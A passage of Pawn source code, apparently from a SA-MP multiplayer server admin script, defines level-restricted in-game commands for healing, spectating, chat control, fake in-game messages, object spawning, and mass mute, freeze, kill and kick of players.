		SendClientMessage(playerid,blue,"    ---= Special Donor Commands =---");
		SendClientMessage(playerid,lightblue," dtrain");
		SendClientMessage(playerid,lightblue,"- ");
		} else return SendClientMessage(playerid,red,"JikyBot: You need to be Special Donor lvl 5 to use this command");
	return 1;
}

CMD:rheal(playerid,params[]) // can i show u something? somwthing what?
{
 if(PlayerInfo[playerid][LoggedIn] == 1)
 {
  if(PlayerInfo[playerid][Level] >= 4)
  {
   new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
   new Float:x, Float:y, Float:z;
   GetPlayerPos(playerid, x, y, z);
   SendClientMessage(playerid,blue,"Restore all in range health and armour!");
   CMDMessageToAdmins(playerid,"RHEAL");
   foreach(Player, i)
   {
    if(IsPlayerInRangeOfPoint(i,10.0, x, y, z))
    {
     SetPlayerHealth(i,100) && SetPlayerArmour(i,100);
    }
   }
  }
  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
 }
 else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
return 1;
}
/*
CMD:rban(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 10) {
		    new ip[128], tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(!strlen(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/rban [playerid] [reason]");
			if(!strlen(tmp2)) return SendClientMessage(playerid, red, "JikyBot: You must give a reason");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);
            if(PlayerInfo[player1][Level] >= 10) return SendClientMessage(playerid,red,"JikyBot: You can not RBan the admins");
		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
				new year,month,day,hour,minuite,second; getdate(year, month, day); gettime(hour,minuite,second);
                CMDMessageToAdmins(playerid,"RBAN");
				format(string,sizeof(string),"%s has been range banned by Administrator %s [Reason: %s] [Date: %d/%d/%d] [Time: %d:%d]",playername,adminname,params[2],day,month,year,hour,minuite);
				MessageToAdmins(grey,string);
				SendClientMessage(playerid,red,string);
				SaveToFile("BanLog",string);
				print(string);
				if(udb_Exists(PlayerName2(player1)) && Logged[player1] == 1) dUserSetINT(PlayerName2(player1)).("banned",1);
				GetPlayerIp(player1,ip,sizeof(ip));
	            strdel(ip,strlen(ip)-2,strlen(ip));
    	        format(ip,128,"%s**",ip);
				format(ip,128,"banip %s",ip);
            	SendRconCommand(ip);
				return 1;
			} else return SendClientMessage(playerid, red, "Player is not connected or is yourself or is the highest level admin");
		} else return SendClientMessage(playerid,red,"JikyBot: You are not a high enough level to use this command");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}
*/
CMD:rangeweapon(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
    new Weap, ammo, name[128], string[128];
    new Float:x, Float:y, Float:z;
        if(sscanf(params,"ii",Weap, ammo)) return SendClientMessage(playerid,red,"JikyBot: Usage:/giveallweapon [weapon name] [ammo]");
        if(Weap == 38 || Weap == 36) return SendClientMessage(playerid,red,"You Can't Give Those Weapons!");
		CMDMessageToAdmins(playerid,"RANGEWEAPON");
       	foreach(Player, i)
   {
    if(IsPlayerInRangeOfPoint(i,10.0, x, y, z))
    {
     GivePlayerWeapon(i,Weap,ammo);
    }
   }
        format(string,sizeof(string),"Administrator %s has given all players in range weapon: %d with %d ammo",name,Weap,ammo);
        SendClientMessageToAll(blue,string);
    }
    else SendClientMessage(playerid,red,"You are not a high enough level to use this command");
    return 1;
}

CMD:uconfig(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4)
	{
		UpdateConfig();
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return CMDMessageToAdmins(playerid,"UCONFIG");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:botcheck(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		for(new i=0; i<MAX_PLAYERS; i++) BotCheck(i);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return CMDMessageToAdmins(playerid,"BOTCHECK");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}


//------------------------------------------------------------------------------
CMD:forbidname(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 10) {
		if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/forbidname [nickname]");
		new File:BLfile, string[128];
		BLfile = fopen("ladmin/config/ForbiddenNames.cfg",io_append);
		format(string,sizeof(string),"%s\r\n",params[1]);
		fwrite(BLfile,string);
		fclose(BLfile);
		UpdateConfig();
		CMDMessageToAdmins(playerid,"FORBIDNAME");
		format(string, sizeof(string), "Administrator \"%s\" has added the name \"%s\" to the forbidden name list", pName(playerid), params );
		return MessageToAdmins(green,string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:forbidword(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 10) {
		if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/forbidword [word]");
		new File:BLfile, string[128];
		BLfile = fopen("ladmin/config/ForbiddenWords.cfg",io_append);
		format(string,sizeof(string),"%s\r\n",params[1]);
		fwrite(BLfile,string);
		fclose(BLfile);
		UpdateConfig();
		CMDMessageToAdmins(playerid,"FORBIDWORD");
		format(string, sizeof(string), "Administrator \"%s\" has added the word \"%s\" to the forbidden word list", pName(playerid), params );
		return MessageToAdmins(green,string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

//==========================[ Spectate Commands ]===============================
#if defined ENABLE_SPEC

CMD:lspec(playerid,params[]) {
    if(PlayerInfo[playerid][Helper] == 1 || PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params) || !IsNumeric(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/lspec [playerid]");
		new specplayerid = strval(params);
		if(PlayerInfo[specplayerid][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(specplayerid) && specplayerid != INVALID_PLAYER_ID) {
        new Float:x,Float:y,Float:z;
			if(specplayerid == playerid) return SendClientMessage(playerid, red, "JikyBot: You cannot spectate yourself");
			if(GetPlayerState(specplayerid) == PLAYER_STATE_SPECTATING && PlayerInfo[specplayerid][SpecID] != INVALID_PLAYER_ID) return SendClientMessage(playerid, red, "Spectate: Player spectating someone else");
			if(GetPlayerState(specplayerid) != 1 && GetPlayerState(specplayerid) != 2 && GetPlayerState(specplayerid) != 3) return SendClientMessage(playerid, red, "Spectate: Player not spawned");
			if( (PlayerInfo[specplayerid][Level] != ServerInfo[MaxAdminLevel]) || (PlayerInfo[specplayerid][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] == ServerInfo[MaxAdminLevel]) )	{
                 GetPlayerPos(playerid,x,y,z);
                 SetPVarFloat(playerid,"xpos",x); // save X POS
                   SetPVarFloat(playerid,"ypos",y); // save Y POS
                   SetPVarFloat(playerid,"zpos",z); // save Z POS
				 StartSpectate(playerid, specplayerid);
				 Spectating[playerid] = 1;
				 TextDrawHideForPlayer(playerid, CountText[playerid]);
				 new str[100];
				 format(str, sizeof(str),"%s has use LSPEC on ID %d", PlayerName2(playerid),specplayerid);
				 MessageToAdmins(blue,str);
				return SendClientMessage(playerid,blue,"Now Spectating");
			} else return SendClientMessage(playerid,red,"JikyBot: You cannot spectate the highest level admin");
		} else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be at least Server Tester to use this command");
}
CMD:ls(playerid,params[]) {
	return cmd_lspec(playerid, params);
}
CMD:lsp(playerid,params[]) {
	return cmd_lspec(playerid, params);
}

CMD:lspv(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/lsv [vehicleid]");
		new specvehicleid = strval(params);
		if(specvehicleid < MAX_VEHICLES) {
			TogglePlayerSpectating(playerid, 1);
			PlayerSpectateVehicle(playerid, specvehicleid);
			PlayerInfo[playerid][SpecID] = specvehicleid;
			PlayerInfo[playerid][SpecType] = ADMIN_SPEC_TYPE_VEHICLE;
			CMDMessageToAdmins(playerid,"SPEC VEHICLE");
			GetPlayerPos(playerid,Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
			GetPlayerFacingAngle(playerid,Pos[playerid][3]);
			return SendClientMessage(playerid,blue,"Now Spectating");
		} else return SendClientMessage(playerid,red, "JikyBot: Invalid Vehicle ID");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be at least Server Tester to use this command");
}
CMD:lsv(playerid,params[]) {
	return cmd_lspv(playerid, params);
}
CMD:specveh(playerid,params[]) {
	return cmd_lspv(playerid, params);
}
CMD:lspecoff(playerid,params[]) {
	#pragma unused params
    if(PlayerInfo[playerid][Helper] == 1 || PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
        if(PlayerInfo[playerid][SpecType] != ADMIN_SPEC_TYPE_NONE) {
			StopSpectate(playerid);
   SetPlayerPos(playerid, GetPVarFloat(playerid,"xpos"), GetPVarFloat(playerid,"ypos"), GetPVarFloat(playerid,"zpos"));
			return SendClientMessage(playerid,blue,"No Longer Spectating");
		} else return SendClientMessage(playerid,red,"JikyBot: You are not spectating");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be at least Server Tester to use this command");
}
CMD:lspoff(playerid,params[]) {
	return cmd_lspecoff(playerid, params);
}
CMD:lsoff(playerid,params[]) {
	return cmd_lspecoff(playerid, params);
}

#endif

//==========================[ CHAT COMMANDS ]===================================

CMD:disablechat(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 3) {
		CMDMessageToAdmins(playerid,"DISABLECHAT");
		new string[128];
		if(ServerInfo[DisableChat] == 0) {
			ServerInfo[DisableChat] = 1;
			format(string,sizeof(string),"Administrator \"%s\" has disabled chat", pName(playerid) );
		} else {
			ServerInfo[DisableChat] = 0;
			format(string,sizeof(string),"Administrator \"%s\" has enabled chat", pName(playerid) );
		} return SendClientMessageToAll(blue,string);
 	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 3 to use this command");
}

CMD:clearchat(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 2) {
		CMDMessageToAdmins(playerid,"CLEARCHAT");
		for(new i = 0; i < 11; i++) SendClientMessageToAll(green," ");
		SendClientMessage(playerid,blue,"Chat Has been cleared by admins!!"); return 1;
 	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 2 to use this command");
}
CMD:clearbox(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5) {
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage(" ");
           SendBoxMessage("Box Cleared!");
 	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 5 to use this command");
return 1;
}

CMD:cc(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 2) {
		CMDMessageToAdmins(playerid,"CLEARCHAT");
		for(new i = 0; i < 11; i++) SendClientMessageToAll(green," ");
		SendClientMessage(playerid,blue,"Chat Has been cleared by admins!!"); return 1;
 	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 2 to use this command");
}
CMD:caps(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/caps [playerid] [\"on\" / \"off\"]");
		new player1 = strval(tmp), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			if(strcmp(tmp2,"on",true) == 0)	{
				CMDMessageToAdmins(playerid,"CAPS");
				PlayerInfo[player1][Caps] = 0;
				if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has allowed you to use capitals in chat", pName(playerid) ); SendClientMessage(playerid,blue,string); }
				format(string,sizeof(string),"You have allowed \"%s\" to use capitals in chat", pName(player1) ); return SendClientMessage(playerid,blue,string);
			} else if(strcmp(tmp2,"off",true) == 0)	{
				CMDMessageToAdmins(playerid,"CAPS");
				PlayerInfo[player1][Caps] = 1;
				if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has prevented you from using capitals in chat", pName(playerid) ); SendClientMessage(playerid,blue,string); }
				format(string,sizeof(string),"You have prevented \"%s\" from using capitals in chat", pName(player1) ); return SendClientMessage(playerid,blue,string);
			} else return SendClientMessage(playerid, red, "JikyBot: Usage:/caps [playerid] [\"on\" / \"off\"]");
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

//==================[ Object & Pickup ]=========================================
CMD:pickup(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"JikyBot: Usage:/pickup [pickup id]");
	    new pickup = strval(params), string[128], Float:x, Float:y, Float:z, Float:a;
	    CMDMessageToAdmins(playerid,"PICKUP");
		GetPlayerPos(playerid, x, y, z);
		GetPlayerFacingAngle(playerid, a);
		x += (3 * floatsin(-a, degrees));
		y += (3 * floatcos(-a, degrees));
		CreatePickup(pickup, 2, x+2, y, z);
		format(string, sizeof(string), "CreatePickup(%d, 2, %0.2f, %0.2f, %0.2f);", pickup, x+2, y, z);
       	SaveToFile("Pickups",string);
		return SendClientMessage(playerid,yellow, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:object(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"JikyBot: Usage:/object [object id]");
	    new object = strval(params), string[128], Float:x, Float:y, Float:z, Float:a;
	    CMDMessageToAdmins(playerid,"OBJECT");
		GetPlayerPos(playerid, x, y, z);
		GetPlayerFacingAngle(playerid, a);
		x += (3 * floatsin(-a, degrees));
		y += (3 * floatcos(-a, degrees));
		CreateObject(object, x, y, z, 0.0, 0.0, a);
		format(string, sizeof(string), "CreateObject(%d, %0.2f, %0.2f, %0.2f, 0.00, 0.00, %0.2f);", object, x, y, z, a);
       	SaveToFile("Objects",string);
		format(string, sizeof(string), "You Have Created Object %d, at %0.2f, %0.2f, %0.2f Angle %0.2f", object, x, y, z, a);
		return SendClientMessage(playerid,yellow, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

//===================[ Move ]===================================================

CMD:move(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 8) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/move [up / down / +x / -x / +y / -y / off]");
		new Float:X, Float:Y, Float:Z;
		if(strcmp(params,"up",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X,Y,Z+5); SetCameraBehindPlayer(playerid); }
		else if(strcmp(params,"down",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X,Y,Z-5); SetCameraBehindPlayer(playerid); }
		else if(strcmp(params,"+x",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X+5,Y,Z);	}
		else if(strcmp(params,"-x",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X-5,Y,Z); }
		else if(strcmp(params,"+y",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X,Y+5,Z);	}
		else if(strcmp(params,"-y",true) == 0)	{
			TogglePlayerControllable(playerid,false); GetPlayerPos(playerid,X,Y,Z);	SetPlayerPos(playerid,X,Y-5,Z);	}
	    else if(strcmp(params,"off",true) == 0)	{
			TogglePlayerControllable(playerid,true);	}
		else return SendClientMessage(playerid,red,"JikyBot: Usage:/move [up / down / +x / -x / +y / -y / off]");
		return 1;
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:moveplayer(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 8) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp)) return SendClientMessage(playerid, red, "JikyBot: Usage:/moveplayer [playerid] [up / down / +x / -x / +y / -y / off]");
	    new Float:X, Float:Y, Float:Z, player1 = strval(tmp);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
		if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			if(strcmp(tmp2,"up",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X,Y,Z+5); SetCameraBehindPlayer(player1);	}
			else if(strcmp(tmp2,"down",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X,Y,Z-5); SetCameraBehindPlayer(player1);	}
			else if(strcmp(tmp2,"+x",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X+5,Y,Z);	}
			else if(strcmp(tmp2,"-x",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X-5,Y,Z); }
			else if(strcmp(tmp2,"+y",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X,Y+5,Z);	}
			else if(strcmp(tmp2,"-y",true) == 0)	{
				GetPlayerPos(player1,X,Y,Z);	SetPlayerPos(player1,X,Y-5,Z);	}
			else SendClientMessage(playerid,red,"JikyBot: Usage:/moveplayer [up / down / +x / -x / +y / -y / off]");
			return 1;
		} else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

//===================[ Fake ]===================================================

#if defined ENABLE_FAKE_CMDS
CMD:fakedeath(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4) {
	    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !strlen(tmp3)) return SendClientMessage(playerid, red, "JikyBot: Usage:/fakedeath [killer] [killee] [weapon]");
		new killer = strval(tmp), killee = strval(tmp2), weap = strval(tmp3);
		if(!IsValidWeapon(weap)) return SendClientMessage(playerid,red,"JikyBot: Invalid Weapon ID");
		if(PlayerInfo[killer][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
		if(PlayerInfo[killee][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");

        if(IsPlayerConnected(killer) && killer != INVALID_PLAYER_ID) {
	        if(IsPlayerConnected(killee) && killee != INVALID_PLAYER_ID) {
	    	  	CMDMessageToAdmins(playerid,"FAKEDEATH");
				SendDeathMessage(killer,killee,weap);
				return SendClientMessage(playerid,blue,"Fake death message sent");
		    } else return SendClientMessage(playerid,red,"JikyBot: Killer is not connected");
	    } else return SendClientMessage(playerid,red,"JikyBot: Killer is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:fakechat(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/fakechat [playerid] [text]");
		new player1 = strval(tmp);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
	        //CMDMessageToAdmins(playerid,"FAKECHAT");
			SendPlayerMessageToAll(player1, params[strlen(tmp)+1]);
			return SendClientMessage(playerid,blue,"Fake message sent");
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:fakecmd(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/fakecmd [playerid] [command]");
		new player1 = strval(tmp);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
	        CMDMessageToAdmins(playerid,"FAKECMD");
	        CallRemoteFunction("OnPlayerCommandText", "is", player1, tmp2);
			return SendClientMessage(playerid,blue,"Fake command sent");
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
#endif

//----------------------------------------------------------------------------//
// 		             	/all Commands                                         //
//----------------------------------------------------------------------------//

CMD:spawnall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"SPAWNAll");
	   	foreach(Player, i) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerPos(i, 0.0, 0.0, 0.0); SpawnPlayer(i);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has spawned all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:muteall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"MUTEALL");
	   	foreach(Player, i) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); PlayerInfo[i][Muted] = 1; PlayerInfo[i][MuteWarnings] = 0;
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has muted all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:unmuteall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"UNMUTEAll");
	   	foreach(Player, i) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); PlayerInfo[i][Muted] = 0; PlayerInfo[i][MuteWarnings] = 0;
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has unmuted all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:getall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"GETAll");
		new Float:x,Float:y,Float:z, interior = GetPlayerInterior(playerid);
    	GetPlayerPos(playerid,x,y,z);
	   	foreach(Player, i) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerPos(i,x+(playerid/4)+1,y+(playerid/4),z); SetPlayerInterior(i,interior);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has teleported all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:healall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 3) {
		CMDMessageToAdmins(playerid,"HEALALL");
	   	foreach(Player, i) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerHealth(i,100.0);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has healed all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 3 to use this command");
}

CMD:armourall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 3) {
		CMDMessageToAdmins(playerid,"ARMOURALL");
	   	foreach(Player, i) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerArmour(i,100.0);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has restored all players armour", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 3 to use this command");
}

CMD:killall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"KILLALL");
	   	foreach(Player, i) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); SetPlayerHealth(i,0.0);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has killed all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:freezeall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"FREEZEALL");
	   	foreach(Player, i) {
 		if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); TogglePlayerControllable(i,false); PlayerInfo[i][Frozen] = 1;
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has frozen all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:unfreezeall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 4) {
		CMDMessageToAdmins(playerid,"UNFREEZEALL");
	   	foreach(Player, i) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); TogglePlayerControllable(i,true); PlayerInfo[i][Frozen] = 0; GameTextForPlayer(i,"~g~Unfreeze", 3000, 3);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has unfrozen all players", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}


CMD:kickall(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 10) {
		CMDMessageToAdmins(playerid,"KICKALL");
	   	foreach(Player, i) {
			if(IsPlayerConnected(i) && (i != playerid) && i != ServerInfo[MaxAdminLevel]) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0); Kick(i);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has kicked all players", pName(playerid) );
		SaveToFile("KickLog",string);
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:o(playerid,params[]) {
	#pragma unused params
